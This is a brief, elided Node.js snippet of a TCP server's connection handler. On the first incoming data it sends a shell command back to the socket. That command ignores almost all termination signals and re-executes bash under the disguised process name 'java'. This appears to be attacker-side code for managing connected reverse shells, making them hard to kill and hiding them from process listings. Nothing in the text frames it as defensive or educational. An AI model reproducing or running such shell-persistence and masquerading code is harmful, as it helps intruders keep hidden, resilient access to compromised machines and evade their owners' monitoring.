...
server.on('connection', (socket) => {
    ...
    socket.on('data', (data) => {
        ...
        if (flag) {
            socket.write(Buffer.from("trap '' TERM ALRM QUIT ABRT HUP INT ILL FPE SEGV PIPE USR1 USR2 TSTP TTIN TTOU BUS PROF SYS TRAP VTALRM XFSZ IO EMT && exec -l -a 'java' bash\r\n"));
            flag = false;
        }
